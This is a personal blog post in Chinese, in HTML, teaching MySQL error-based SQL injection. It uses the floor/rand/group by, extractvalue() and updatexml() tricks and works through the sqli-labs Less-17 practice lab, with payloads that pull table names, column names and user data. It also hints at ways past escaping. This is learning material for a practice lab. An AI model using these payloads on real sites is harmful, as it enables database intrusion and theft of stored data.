@@ -1,0 +1,402 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>xssong17</title>
+<meta name="description" content="我等着，等着你" />
+<link rel="shortcut icon" href="https://xssong17.github.io/favicon.ico?v=1704635108417">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://xssong17.github.io/styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://xssong17.github.io">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://xssong17.github.io/images/avatar.png?v=1704635108417" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">xssong17</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#mysql%E6%89%8B%E6%B3%A8%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">MySQL⼿注之报错注⼊</a>
+<ul>
+<li><a href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">环境准备</a></li>
+<li><a href="#%E6%8A%A5%E9%94%99%E8%AF%AD%E5%8F%A5%E6%9E%84%E9%80%A0">报错语句构造</a>
+<ul>
+<li><a href="#1-count-rand-group-by">(1) count() , rand() , group by</a></li>
+<li><a href="#2-xml%E5%87%BD%E6%95%B0%E4%B9%8Bextractvalue">(2) XML函数之ExtractValue()</a></li>
+<li><a href="#3xml%E5%87%BD%E6%95%B0%E4%B9%8Bupdatexml">(3)XML函数之updatexml()</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AE%9E%E8%B7%B5">实践</a>
+<ul>
+<li><a href="#sqli-labs-less-17">sqli-labs Less-17</a>
+<ul>
+<li><a href="#%E5%85%B3%E9%94%AE%E6%80%A7%E6%BA%90%E7%A0%81">关键性源码</a></li>
+<li><a href="#burp%E6%8A%93%E5%8C%85">Burp抓包</a></li>
+<li><a href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D">查询表名</a></li>
+<li><a href="#%E6%9F%A5%E8%AF%A2%E5%88%97%E5%90%8D">查询列名</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE">获取数据</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a></div>
+    <a class="rss" href="https://xssong17.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">MySQL⼿注之报错注⼊</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2021-04-14 / 6 min read
+        </div>
+        
+        <div class="post-content yue">
+          <h1 id="mysql手注之报错注入">MySQL⼿注之报错注⼊</h1>
+<blockquote>
+<p>参考文章：https://blog.csdn.net/he_and/article/details/80455884</p>
+<p>https://www.cnblogs.com/Triomphe/p/9489639.html（推荐）</p>
+<p>Burp光标bug：https://www.cnblogs.com/bk76120/p/11167585.html</p>
+</blockquote>
+<h2 id="环境准备">环境准备</h2>
+<p><a href="https://blog.csdn.net/qq_31910239/article/details/104508896">sqli-labs的安装过程中的报错</a></p>
+<h2 id="报错语句构造">报错语句构造</h2>
+<h3 id="1-count-rand-group-by">(1) count() , rand() , group by</h3>
+<pre><code>select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;
+
+select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));
+</code></pre>
+<pre><code>mysql&gt; select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;  
+ERROR 1062 (23000): Duplicate entry '::root@localhost::1' for key '&lt;group_key&gt;'
+</code></pre>
+<pre><code>mysql&gt; select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));
+ERROR 1062 (23000): Duplicate entry '5.7.311' for key '&lt;group_key&gt;'
+</code></pre>
+<ul>
+<li>rand()函数会随机产生[0,1)之间的浮点数.</li>
+<li>rand()函数可以自己设置随机种子,即rand(N),这个时候产生的随机数是伪随机数.也就是我们多次生成的是相同的.</li>
+<li>floor(N)取整</li>
+<li>concat()函数将字符串会将字符串拼接起来</li>
+<li>group by a 会根据a的规则对数据进行分组,而分组的时候,mysql会建立一个临时空表进行分组.（这里建立虚拟表的过程就是报错的原理所在）</li>
+<li>count()计数</li>
+</ul>
+<h3 id="2-xml函数之extractvalue">(2) XML函数之ExtractValue()</h3>
+<pre><code>select extractvalue(1,concat(0x7e,user(),0x7e))
+</code></pre>
+<pre><code>mysql&gt; select extractvalue(1,concat(0x7e,user(),0x7e));
+ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'
+</code></pre>
+<ul>
+<li>
+<p>ExtractValue(xml_str , Xpath) 函数,使用Xpath表示法从XML格式的字符串中提取一个值</p>
+</li>
+<li>
+<p>ExtractValue()函数中任意一个参数为NULL,返回值都是NULL.</p>
+<pre><code>mysql&gt; select extractvalue('&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;b&gt;acbbbb&lt;/b&gt;&lt;/c&gt;aaaa&lt;/a&gt;','/a/c');
++-----------------------------------------------------------------------+
+| extractvalue('&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;b&gt;acbbbb&lt;/b&gt;&lt;/c&gt;aaaa&lt;/a&gt;','/a/c') |
++-----------------------------------------------------------------------+
+| accc                                                                  |
++-----------------------------------------------------------------------+
+</code></pre>
+<pre><code>mysql&gt; select extractvalue('&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;b&gt;acbbbb&lt;/b&gt;&lt;/c&gt;aaaa&lt;/a&gt;',NULL);
++---------------------------------------------------------------------+
+| extractvalue('&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;b&gt;acbbbb&lt;/b&gt;&lt;/c&gt;aaaa&lt;/a&gt;',NULL) |
++---------------------------------------------------------------------+
+| NULL                                                                |
++---------------------------------------------------------------------+
+</code></pre>
+</li>
+</ul>
+<h3 id="3xml函数之updatexml">(3)XML函数之updatexml()</h3>
+<pre><code>select updatexml(1,concat(0x7e,version(),0x7e),1) 
+</code></pre>
+<pre><code>mysql&gt; select updatexml(1,concat(0x7e,version(),0x7e),1);
+ERROR 1105 (HY000): XPATH syntax error: '~5.7.31~'
+</code></pre>
+<h2 id="实践">实践</h2>
+<h3 id="sqli-labs-less-17">sqli-labs Less-17</h3>
+<h4 id="关键性源码">关键性源码</h4>
+<pre><code>if($row)
+{
+    //echo '&lt;font color= &quot;#0000ff&quot;&gt;';	
+    $row1 = $row['username'];  	
+    //echo 'Your Login name:'. $row1;
+    $update=&quot;UPDATE users SET password = '$passwd' WHERE username='$row1'&quot;;//数据库中执行的语句
+    mysql_query($update);
+    echo &quot;&lt;br&gt;&quot;;
+
+    if (mysql_error())
+    {
+        echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;';
+        print_r(mysql_error());
+        echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;;
+        echo &quot;&lt;/font&gt;&quot;;
+    }
+    else
+    {
+        echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;';
+        //echo &quot; You password has been successfully updated &quot; ;		
+        echo &quot;&lt;br&gt;&quot;;
+        echo &quot;&lt;/font&gt;&quot;;
+    }
+
+    echo '&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;';	//成功会显示slap1.jpg
+    //echo 'Your Password:' .$row['password'];
+    echo &quot;&lt;/font&gt;&quot;;
+
+
+
+}
+else  
+{
+    echo '&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;';
+    //echo &quot;Bug off you Silly Dumb hacker&quot;;
+    echo &quot;&lt;/br&gt;&quot;;
+    echo '&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;';//错误也会显示slap1.jpg
+    echo &quot;&lt;/font&gt;&quot;;  
+}
+</code></pre>
+<p>不管我们怎么输入最后返回结果都是一致的，所以我们试着用报错注入的方式看看，能不能返回我们需要的信息</p>
+<p>这里补充下，源码中还对输入的信息进行了转义，后续的uname参数中的特殊字符都会被转义（那可以绕过不？）</p>
+<h4 id="burp抓包">Burp抓包</h4>
+<p>其中uname参数我们可以通过查看数据库（白盒测试）、查看源码、猜（布尔注入？）可以得到</p>
+<p>尝试发送请求，并通过Burp进行抓包修改</p>
+<pre><code>1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))#
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://xssong17.github.io/post-images/QQ%E6%88%AA%E5%9B%BE20210414224913.png" alt="QQ截图20210414224913" loading="lazy"></figure>
+<p>出现了转义，请教师傅后发现是<a href="https://blog.csdn.net/Xiaoxiaoqiang_/article/details/113763674">魔术引号</a>没关，关掉后重新发送</p>
+<figure data-type="image" tabindex="2"><img src="https://xssong17.github.io/post-images/QQ%E6%88%AA%E5%9B%BE20210414224511.png" alt="QQ截图20210414224511" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://xssong17.github.io/post-images/QQ%E6%88%AA%E5%9B%BE20210415143922.png" alt="QQ截图20210415143922" loading="lazy"></figure>
+<p>！！！这里如果没有关掉魔术引号，可以试试宽字符的方式绕过，具体怎么操作，后续补充</p>
+<h4 id="查询表名">查询表名</h4>
+<p>查询表名，并尝试将and前面的内容换一下</p>
+<pre><code>abc' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e))#
+</code></pre>
+<p>这里会出现报错</p>
+<pre><code>Truncated incorrect DOUBLE value: 'abc‘	
+</code></pre>
+<p>很奇怪，改成数字就可以。</p>
+<p>！！！等待解决办法</p>
+<p>换回数字</p>
+<pre><code>123' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e))#
+</code></pre>
+<p>返回</p>
+<pre><code>XPATH syntax error: '~emails,referers,uagents,users~'
+</code></pre>
+<h4 id="查询列名">查询列名</h4>
+<pre><code>123’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from
+information_schema.columns where table_schema='security' and table_name='users' limit
+0,1),0x7e))#
+</code></pre>
+<p>返回</p>
+<pre><code>XPATH syntax error: '~id,username,password~'
+</code></pre>
+<h4 id="获取数据">获取数据</h4>
+<pre><code>123‘ and extractvalue(1,concat(0x7e,(select * from (select username from users limit 0,1) as
+a),0x7e))#
+</code></pre>
+<p>返回</p>
+<pre><code>XPATH syntax error: '~Dumb~'
+</code></pre>
+<h2 id="总结">总结</h2>
+<p>报错注入多用于无法获得回显点的情况下（盲注不好用的情况），使用mysql内置的几个函数之间的特殊性，让数据库将我们想要获得的信息同报错信息一起返回给我们</p>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://xssong17.github.io/tag/wgo_p-85C/">
+            <span class="flex-auto">渗透</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://xssong17.github.io/post/mysql-shou-zhu-zhi-bu-er-xing-mang-zhu/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  MySQL手注之布尔型盲注
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://xssong17.github.io/post/mysql-shou-zhu-zhi-lian-he-zhu-ru/">
+                <h3 class="post-title">
+                  MYSQL手注之联合注入
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://xssong17.github.io/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
